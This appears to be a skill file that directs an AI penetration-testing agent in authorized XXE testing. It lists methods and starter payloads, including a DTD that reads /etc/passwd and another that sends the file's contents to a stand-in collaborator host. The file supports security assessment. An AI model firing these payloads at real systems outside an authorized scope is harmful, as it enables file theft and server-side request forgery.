---
name: xxe-attacks
description: >-
  Exploit XML External Entity injection (CWE-611): classic in-band file read, blind/OOB
  exfiltration via external DTD + parameter entities, SSRF via entities, and billion-laughs
  DoS awareness. Invoke when the app parses XML input (SOAP, SAML, SVG, DOCX/XLSX, RSS,
  `Content-Type: application/xml`) and entity processing may be enabled.
family: 05-deserialization
type: exploit
owasp: [A05:2021, A08:2021]
cwe: [CWE-611, CWE-827]
requires: [scope-guard, util-oast-oob, evidence-recorder]
authorization: required
---

# XXE (XML External Entity)

## Invoke when
- Any XML is parsed from input: raw XML body, SOAP, SVG upload, Office OOXML, SAML, RSS.

## Methodology
1. In-band: define an external entity reading a local file, reflect it in the response.
2. Blind/OOB: host an external DTD that uses parameter entities to exfil file contents to a collaborator.
3. SSRF: point the entity SYSTEM URL at internal services.
4. Error-based exfil when direct reflection is unavailable.

## Starter payloads
- In-band: `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`
- OOB DTD: `<!ENTITY % f SYSTEM "file:///etc/passwd"><!ENTITY % o "<!ENTITY e SYSTEM 'http://collab.tld/?x=%f;'>">%o;`
- SVG upload carrying the same DOCTYPE.

## False-positive filters
- Parser with entities disabled (`DTD` ignored) returns no entity value — no callback ≠ blocked egress necessarily; corroborate.

## Chains to
- `ssrf-triage` (entity-driven SSRF), `file-upload-abuse` (SVG/OOXML vector), `chain-builder`.
